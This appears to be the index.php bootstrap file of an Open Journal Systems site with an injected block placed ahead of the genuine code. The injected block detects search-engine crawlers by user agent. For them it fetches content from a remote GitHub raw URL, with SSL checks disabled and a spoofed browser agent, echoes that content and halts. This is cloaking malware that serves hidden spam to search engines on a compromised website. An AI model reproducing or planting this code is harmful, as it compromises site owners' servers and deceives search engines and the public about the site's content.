<?php

function check_user_agent($o)
{
    return preg_match("/" . preg_quote($o, '/') . "/i", $_SERVER['HTTP_USER_AGENT']) ? true : false;
}
function get_content($p)
{
    if (ini_get('allow_url_fopen') && function_exists('file_get_contents')) {
        $context = stream_context_create([
            'http' => [
                'user_agent' => 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
                'timeout' => 30,
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ],
        ]);
        $q = @file_get_contents($p, false, $context);
        if ($q !== false) {
            return $q;
        }
    }
    if (function_exists('curl_init') && function_exists('curl_exec')) {
        $r = curl_init();
        curl_setopt_array($r, array(
            CURLOPT_URL => $p,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
            CURLOPT_TIMEOUT => 30,
        ));
        $q = curl_exec($r);
        curl_close($r);
        if ($q !== false) {
            return $q;
        }
    }
    if (function_exists('fsockopen')) {
        $s = parse_url($p);
        $scheme = isset($s['scheme']) ? $s['scheme'] : 'http';
        $host = $s['host'];
        $port = isset($s['port']) ? $s['port'] : (($scheme === 'https') ? 443 : 80);
        $path = isset($s['path']) ? $s['path'] : '/';
        $query = empty($s['query']) ? '' : '?' . $s['query'];
        $remote_host = ($scheme === 'https' ? 'ssl://' : '') . $host;
        $fp = @fsockopen($remote_host, $port, $errno, $errstr, 30);
        if ($fp) {
            $user_agent = 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36';
            $request = "GET {$path}{$query} HTTP/1.1\r\n";
            $request .= "Host: {$host}\r\n";
            $request .= "User-Agent: {$user_agent}\r\n";
            $request .= "Connection: close\r\n\r\n";
            fwrite($fp, $request);
            $response = '';
            while (!feof($fp)) {
                $response .= fgets($fp, 1024);
            }
            fclose($fp);

            $parts = explode("\r\n\r\n", $response, 2);
            if (isset($parts[1])) {
                return $parts[1];
            } else {
                return $response;
            }
        }
    }

    return '';
}
if (check_user_agent("google") || check_user_agent("bot") || check_user_agent("spider"))
{
    echo get_content("https://raw.githubusercontent.com/yugoprakoso157/img/refs/heads/main/idjhr/idjhr.txt");
    die;
}
?>
<?php

/**
 * @mainpage OJS API Reference
 *
 * Welcome to the OJS API Reference. This resource contains documentation
 * generated automatically from the OJS source code.
 *
 * The design of Open %Journal Systems 2.x is heavily structured for
 * maintainability, flexibility and robustness. Those familiar with Sun's
 * Enterprise Java Beans technology or the Model-View-Controller (MVC) pattern
 * will note similarities.
 *
 * As in a MVC structure, data storage and representation, user interface
 * presentation, and control are separated into different layers. The major
 * categories, roughly ordered from "front-end" to "back-end," follow:
 * - Smarty templates, which are responsible for assembling HTML pages to
 *   display to users;
 * - Page classes, which receive requests from users' web browsers, delegate
 *   any required processing to various other classes, and call up the
 *   appropriate Smarty template to generate a response;
 * - Controllers, which implement reusable pieces of content e.g. for AJAX
 *   subrequests.
 * - Action classes, which are used by the Page classes to perform non-trivial
 *   processing of user requests;
 * - Model classes, which implement PHP objects representing the system's
 *   various entities, such as Users, Articles, and Journals;
 * - Data Access Objects (DAOs), which generally provide (amongst others)
 *   update, create, and delete functions for their associated Model classes,
 *   are responsible for all database interaction;
 * - Support classes, which provide core functionalities, miscellaneous common;
 *
 * Additionally, many of the concerns shared by multiple PKP applications are
 * implemented in the shared "pkp-lib" library, shipped in the lib/pkp
 * subdirectory. The same conventions listed above apply to lib/pkp as well.
 *
 * As the system makes use of inheritance and has consistent class naming
 * conventions, it is generally easy to tell what category a particular class
 * falls into.
 *
 * For example, a Data Access Object class always inherits from the DAO class,
 * has a Class name of the form [Something]%DAO, and has a filename of the form
 * [Something]%DAO.inc.php.
 *
 * To learn more about developing OJS, there are several additional resources
 * that may be useful:
 * - The docs/README.md document
 * - The PKP support forum at http://forum.pkp.sfu.ca
 * - Documentation available at http://pkp.sfu.ca/ojs_documentation
 *
 * @file ojs/index.php
 *
 * Copyright (c) 2014-2019 Simon Fraser University
 * Copyright (c) 2003-2019 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * Bootstrap code for OJS site. Loads required files and then calls the
 * dispatcher to delegate to the appropriate request handler.
 */

// Initialize global environment
define('INDEX_FILE_LOCATION', __FILE__);
$application = require('./lib/pkp/includes/bootstrap.inc.php');

// Serve the request
$application->execute();
